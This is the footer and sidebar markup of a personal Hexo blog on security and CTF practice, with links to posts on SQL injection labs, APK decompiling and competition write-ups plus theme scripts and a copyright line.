    <span><a href="/2021/04/24/sqlilabtrain/" title="sqlilabs less-1-17">sqlilabs less-1-17</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/10/26/akp%E5%8F%8D%E7%BC%96%E8%AF%91/" title="apk反编译工具的安装及使用">apk反编译工具的安装及使用</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/03/28/xctf%E6%96%B0%E6%89%8B%E5%9C%BA/" title="xctf新手场">xctf新手场</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/25/redis%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="redis环境搭建">redis环境搭建</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/09/20/sqlbypass/" title="sqlbypass">sqlbypass</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/02/20/check_in_wp(3)/" title="2022年的一些比赛部分题解">2022年的一些比赛部分题解</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">muhua @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2023/02/20/check_in_wp(3)/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
